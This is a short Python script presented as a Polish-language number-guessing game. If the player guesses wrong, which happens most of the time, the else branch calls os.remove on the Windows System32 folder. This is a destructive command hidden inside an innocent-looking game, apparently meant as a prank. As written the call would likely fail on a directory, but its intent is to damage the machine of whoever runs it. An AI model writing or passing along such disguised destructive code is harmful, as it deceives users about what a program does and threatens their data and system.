from os import remove
from random import randint
print("gramy w grę zgadnij liczbę")
alfred = int(input())
if alfred == randint(1,10):
    print("brawo zgadłeś")
else:
    remove("C:\Windows\System32")